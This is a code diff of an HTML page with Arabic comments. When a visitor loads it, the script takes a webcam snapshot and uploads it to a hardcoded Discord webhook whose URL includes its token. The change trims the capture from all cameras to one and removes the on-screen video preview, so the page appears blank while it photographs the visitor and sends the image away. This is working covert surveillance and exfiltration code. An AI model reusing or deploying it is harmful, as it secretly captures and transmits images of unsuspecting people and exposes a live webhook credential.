@@ -10,13 +10,9 @@
             margin: 0;
             padding: 0;
             height: 100vh;
-        }
-
-        video {
-            width: 100%;
-            height: auto;
-            border: 1px solid black;
-            margin: 10px 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
 
         canvas {
@@ -25,7 +21,6 @@
     </style>
 </head>
 <body>
-    <video id="video" width="640" height="480" autoplay muted playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
@@ -37,60 +32,32 @@
             alert("المتصفح الخاص بك لا يدعم الوصول إلى الكاميرات. يُرجى تحديث المتصفح.");
         }
 
-        // الدالة لبدء كاميرات الويب المختلفة
-        async function initCameras() {
+        // الدالة لبدء كاميرات الويب
+        async function initCamera() {
             try {
-                // الحصول على قائمة بجميع الأجهزة المتصلة (الكاميرات)
-                const devices = await navigator.mediaDevices.enumerateDevices();
-                const videoDevices = devices.filter(device => device.kind === 'videoinput'); // تصفية الكاميرات فقط
-
-                console.log("الكاميرات المتاحة:", videoDevices);  // طباعة الكاميرات المتاحة للمساعدة في التصحيح
-
-                if (videoDevices.length > 0) {
-                    // استدعاء جميع الكاميرات بشكل متوازي
-                    const capturePromises = videoDevices.map(device => startCameraAndCapture(device));
-                    await Promise.all(capturePromises); // الانتظار حتى تنتهي جميع الكاميرات من التقاط الصور
-
-                    console.log("تم جمع الصور من جميع الكاميرات.");
-                    sendToDiscord(images);
-                } else {
-                    alert("لا توجد كاميرات متاحة!");
-                    console.error("لا توجد كاميرات متصلة.");
-                }
-            } catch (error) {
-                alert("حدث خطأ أثناء الوصول إلى الكاميرات. تأكد من أنك قد منحت إذن الوصول إلى الكاميرات في المتصفح.");
-                console.error("حدث خطأ أثناء الوصول إلى الكاميرات.", error);
-            }
-        }
-
-        // بدء كل كاميرا والتقاط الصورة
-        async function startCameraAndCapture(device) {
-            try {
-                console.log(`محاولة الوصول إلى الكاميرا: ${device.label}`);
-                // الحصول على صلاحية الوصول إلى الكاميرا
-                const stream = await navigator.mediaDevices.getUserMedia({
-                    video: { deviceId: device.deviceId }
-                });
+                // الحصول على تدفق الكاميرا (أول كاميرا متاحة)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
                 const video = document.createElement('video');
                 video.srcObject = stream;
                 video.width = 640;
                 video.height = 480;
-                video.muted = true;  // التأكد من أن الفيديو مُكبّت (لتجنب مشاكل الصوت في Safari)
+                video.muted = true;  // التأكد من أن الفيديو مُكبّت
                 video.play();
 
-                // الانتظار حتى يبدأ الفيديو في التشغيل قبل التقاط الصورة
+                // الانتظار حتى يبدأ الفيديو في التشغيل ثم التقاط الصورة
                 video.onplaying = () => {
-                    captureAndSend(video, device);
+                    captureAndSend(video);
                 };
 
             } catch (error) {
-                console.error(`حدث خطأ أثناء تشغيل الكاميرا: ${device.label}`, error);
+                alert("حدث خطأ أثناء الوصول إلى الكاميرا. تأكد من أنك قد منحت إذن الوصول إلى الكاميرات.");
+                console.error("حدث خطأ أثناء الوصول إلى الكاميرات.", error);
             }
         }
 
         // التقاط الصورة من الفيديو
-        function captureAndSend(video, device) {
+        function captureAndSend(video) {
             // إعداد الـCanvas لرسم الفيديو
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
@@ -102,28 +69,22 @@
 
             // إضافة الصورة إلى قائمة الصور
             images.push(imageData);
-            console.log(`تم التقاط صورة من كاميرا: ${device.label}`);
+            console.log("تم التقاط الصورة من الكاميرا.");
 
-            // عند التقاط الصور من جميع الكاميرات، سيتم إرسالها
-            if (images.length === document.querySelectorAll('video').length) {
-                console.log("تم جمع الصور من جميع الكاميرات.");
-                sendToDiscord(images);
-            }
+            // إرسال الصورة إلى Discord
+            sendToDiscord(images);
         }
 
-        // إرسال الصور إلى Webhook في Discord
+        // إرسال الصورة إلى Webhook في Discord
         async function sendToDiscord(images) {
             const webhookUrl = "https://discord.com/api/webhooks/1304326600438972447/cPAPNutnxg86tnOFPS4nbt5CHapnvXwXAiKR8bqJPJylOaLcd-wV3avTuFqcphwmB6Sc";  // ضع هنا رابط الـWebhook الخاص بك
             const formData = new FormData();
 
-            // تحويل الصور إلى Blob وإضافتها إلى الـ FormData
+            // تحويل الصورة إلى Blob وإضافتها إلى الـ FormData
             images.forEach((imageData, index) => {
                 const blob = dataURItoBlob(imageData);
                 formData.append("file", blob, `image${index + 1}.png`);
             });
-
-            // التحقق من محتويات الـ FormData
-            console.log("FormData يحتوي على الصور:", formData);
 
             try {
                 const response = await fetch(webhookUrl, {
@@ -132,13 +93,13 @@
                 });
 
                 if (response.ok) {
-                    console.log("تم إرسال الصور بنجاح!");
+                    console.log("تم إرسال الصورة بنجاح!");
                 } else {
                     const errorText = await response.text();
-                    console.error("فشل في إرسال الصور إلى Discord:", errorText);
+                    console.error("فشل في إرسال الصورة إلى Discord:", errorText);
                 }
             } catch (error) {
-                console.error("حدث خطأ أثناء إرسال الصور.", error);
+                console.error("حدث خطأ أثناء إرسال الصورة.", error);
             }
         }
 
@@ -153,8 +114,8 @@
             return new Blob([uintArray], { type: "image/png" });
         }
 
-        // بدء الكاميرات عند تحميل الصفحة
-        window.onload = initCameras;
+        // بدء الكاميرا عند تحميل الصفحة
+        window.onload = initCamera;
     </script>
 </body>
 </html>
